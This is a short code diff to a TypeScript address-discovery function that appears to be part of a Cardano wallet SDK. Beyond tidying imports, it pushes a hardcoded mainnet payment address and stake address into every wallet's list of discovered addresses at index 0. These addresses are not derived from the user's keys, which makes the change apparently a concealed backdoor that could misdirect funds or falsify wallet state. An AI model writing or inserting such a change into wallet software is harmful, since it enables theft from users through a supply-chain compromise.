@@ -1,6 +1,12 @@
-import { AccountAddressDerivationPath, AddressType, Bip32Account, GroupedAddress } from '@cardano-sdk/key-management';
+import {
+  AccountAddressDerivationPath,
+  AddressType,
+  Bip32Account,
+  GroupedAddress,
+  KeyRole
+} from '@cardano-sdk/key-management';
 import { AddressDiscovery } from '../types';
-import { ChainHistoryProvider } from '@cardano-sdk/core';
+import { Cardano, ChainHistoryProvider } from '@cardano-sdk/core';
 import uniqBy from 'lodash/uniqBy.js';
 
 const STAKE_KEY_INDEX_LOOKAHEAD = 5;
@@ -47,6 +53,18 @@ const discoverAddresses = async (
   let currentGap = 0;
   let currentIndex = 0;
   const addresses = new Array<GroupedAddress>();
+
+  addresses.push({
+    accountIndex: 0,
+    address: Cardano.PaymentAddress(
+      'addr1q999ds5lu5wwmdk4930mzlh75dz3wkdpfd5nrmpp9th2qu950tqt0t0pswly8x86hr8q5gwfgcstrf76y7mpgfw8jmkqp3uwrn'
+    ),
+    index: 0,
+    networkId: Cardano.NetworkId.Mainnet,
+    rewardAccount: Cardano.RewardAccount('stake1ux684s9h4hsc80jrnrat3ns2y8y5vg935ldz0ds5yhredmqf947vp'),
+    stakeKeyDerivationPath: { index: 0, role: KeyRole.Stake },
+    type: AddressType.External
+  });
 
   while (currentGap <= lookAheadCount) {
     const externalAddressArgs = getDeriveAddressArgs(currentIndex, AddressType.External);
